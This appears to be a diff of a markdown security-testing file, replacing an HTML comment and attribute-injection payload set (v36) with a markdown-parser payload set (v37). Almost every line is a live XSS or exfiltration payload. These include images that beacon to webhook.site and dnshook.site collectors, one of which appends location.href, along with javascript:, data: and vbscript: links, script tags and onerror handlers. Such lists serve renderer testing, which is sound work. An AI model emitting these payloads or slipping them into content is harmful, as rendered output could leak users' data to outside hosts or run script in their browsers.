@@ -1,190 +1,192 @@
-# Security Research - v36
+# Security Research - v37
 
-## HTML Comment & Attribute Injection Testing
+## Markdown-Specific Edge Cases & Escaping
 
-Testing comment handling, CDATA sections, and attribute-based attacks.
-
----
-
-### 1) HTML Comment Variations
-
-<!-- Normal comment -->
-
-<!- Single dash comment -->
-
-<!--- Triple dash comment --->
-
-<!--> Truncated comment -->
-
-<!--x<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/comment-img.gif">-->
-
-<!----><img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/double-dash-img.gif"><!---->
+Testing markdown parser vulnerabilities and escaping edge cases.
 
 ---
 
-### 2) CDATA Sections
+### 1) Markdown Image in HTML Attribute
 
-<![CDATA[<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/cdata-img.gif">]]>
+<a href="![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/md-in-href.gif)">Markdown img in href</a>
 
----
-
-### 3) Processing Instructions
-
-<?xml version="1.0"?>
-<?xml-stylesheet href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/pi-style.css"?>
+<div title="![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/md-in-title.gif)">Markdown img in title</div>
 
 ---
 
-### 4) Null Byte Injection
+### 2) Escape Sequence Breaking
 
-<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/null%00byte.gif">
+\![not-image](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape1.gif)
 
-<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/null%00link">Null in href</a>
+!\[broken](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape2.gif)
 
----
+![test\](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape3.gif)
 
-### 5) Attribute Without Quotes
-
-<a href=https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/no-quotes-href>No Quotes Link</a>
-
-<img src=https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/no-quotes-img.gif>
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape4.gif\)
 
 ---
 
-### 6) Mixed Quote Styles
+### 3) Reference-Style Links with Injection
 
-<a href='https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/single-quote'>Single Quotes</a>
+[normal-ref]: https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/ref-normal.gif
 
-<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/double-quote">Double Quotes</a>
+![ref-img][normal-ref]
 
----
+[inject-ref]: javascript:alert(1)
 
-### 7) Attribute Order Manipulation
+[Try inject ref][inject-ref]
 
-<a onclick="alert(1)" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/attr-order1">Onclick First</a>
+[data-ref]: data:text/html,<script>alert(1)</script>
 
-<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/attr-order2" onclick="alert(1)">Href First</a>
-
----
-
-### 8) Duplicate Attributes
-
-<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-first" href="javascript:alert(1)">Duplicate href</a>
-
-<a href="javascript:alert(1)" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-second">Duplicate href reversed</a>
-
-<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-img-first.gif" src="javascript:alert(1)">
+[Try data ref][data-ref]
 
 ---
 
-### 9) Newlines in Attributes
+### 4) Nested Markdown Structures
 
-<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/newline
-link">Newline in href</a>
+[![nested-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/nested-img.gif)](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/nested-link)
 
-<a href="java
-script:alert(1)">JS with newline</a>
+[![double-nest](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/double-nest.gif)](javascript:alert(1))
 
 ---
 
-### 10) Tab Characters in Protocol
+### 5) URL-Encoded Markdown Chars
 
-<a href="java	script:alert(1)">JS with tab</a>
+![%5B%5D](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/url-encoded-brackets.gif)
 
-<a href="	javascript:alert(1)">Leading tab JS</a>
-
----
-
-### 11) Entity Encoded Tags
-
-&lt;script&gt;alert(1)&lt;/script&gt;
-
-&#60;script&#62;alert(1)&#60;/script&#62;
-
-&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/%21%5Binjected%5D%28evil%29.gif)
 
 ---
 
-### 12) Backtick Attribute Delimiter
+### 6) Markdown in Fenced Code Block Injection
 
-<a href=`https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/backtick`>Backtick href</a>
+```
+![should-not-render](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/in-code-block.gif)
+```
 
----
-
-### 13) Tag Name Confusion
-
-<a/href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/slash-sep">Slash separator</a>
-
-<a	href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/tab-sep">Tab separator</a>
-
-<a
-href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/newline-sep">Newline separator</a>
+```html
+<img src="https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/in-html-code.gif">
+```
 
 ---
 
-### 14) Unicode Tag Names
+### 7) Incomplete/Malformed Markdown
 
-<а href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/cyrillic-a">Cyrillic A tag</а>
+![](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/empty-alt.gif)
 
-<ａ href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/fullwidth-a">Fullwidth A tag</ａ>
+![ ](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/space-alt.gif)
 
----
+![test](
 
-### 15) Self-Closing Tag Abuse
+![test]()
 
-<script/src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/script-self-close.js"/>
-
-<img/src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/img-self-close.gif"/>
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/valid-after-malformed.gif)
 
 ---
 
-### 16) XML Namespace Injection
+### 8) Unicode in Image Alt/URL
 
-<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/xmlns-link">XLink href</a>
+![🔥💀](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/emoji-alt.gif)
 
-<svg:a xmlns:svg="http://www.w3.org/2000/svg" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/svg-xmlns">SVG namespaced</svg:a>
-
----
-
-### 17) CSS Expression Attempt
-
-<div style="background:url(https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/css-bg.gif)">CSS bg</div>
-
-<div style="list-style-image:url(https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/css-list.gif)">CSS list</div>
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/tëst-üñîcödé.gif)
 
 ---
 
-### 18) srcset Attribute
+### 9) Whitespace Variations in Markdown
 
-<img srcset="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/srcset-1x.gif 1x, https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/srcset-2x.gif 2x">
+![test](   https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/leading-space.gif)
+
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/trailing-space.gif   )
+
+![test](	https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/tab.gif)
+
+![test](
+https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/newline.gif
+)
 
 ---
 
-### 19) Picture Element
+### 10) Markdown Link Title Injection
 
-<picture>
-<source srcset="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/picture-source.gif">
-<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/picture-fallback.gif">
-</picture>
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title1.gif "Normal title")
+
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title2.gif "onclick=alert(1)")
+
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title3.gif "" onclick="alert(1)")
+
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title4.gif ')><img src=x onerror=alert(1)>')
 
 ---
 
-### 20) Template Literal Injection
+### 11) Autolink Protocol Abuse
 
-<div data-test="${alert(1)}">Template literal in data attr</div>
+<javascript:alert(1)>
 
-<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/${location.href}">Template in URL</a>
+<data:text/html,<script>alert(1)</script>>
+
+<vbscript:alert(1)>
+
+<https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/autolink.gif>
+
+---
+
+### 12) Task List XSS
+
+- [ ] <script>alert('task')</script>
+- [x] <img src="https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/task-img.gif">
+- [ ] [task link](javascript:alert(1))
+
+---
+
+### 13) Blockquote Injection
+
+> <script>alert('quote')</script>
+> ![quote-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/quote-img.gif)
+
+---
+
+### 14) Table Cell XSS
+
+| Header | Test |
+|--------|------|
+| <script>alert(1)</script> | normal |
+| ![table-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/table-img.gif) | test |
+| [link](javascript:alert(1)) | js link |
+
+---
+
+### 15) Footnote Injection
+
+This has a footnote[^1].
+
+[^1]: <script>alert('footnote')</script> ![footnote-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/footnote-img.gif)
+
+---
+
+### 16) Definition List (if supported)
+
+Term
+: <script>alert('def')</script>
+: ![def-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/def-img.gif)
+
+---
+
+### 17) HTML Entity in Markdown
+
+![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/entity&#x2d;dash.gif)
+
+![test](&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1))
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v36-dns.b54c2a11-5e05-48b6-88fd-1ea979df7f5b.dnshook.site/dns.gif)
+![dns](https://v37-dns.d5f00a91-9c8e-4765-a71b-87f5503a7d03.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/v36-canary.gif)
+![canary](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/v37-canary.gif)
 
 ---
 
-*v36 - HTML comments, CDATA, and attribute injection*
+*v37 - Markdown-specific edge cases & escaping*
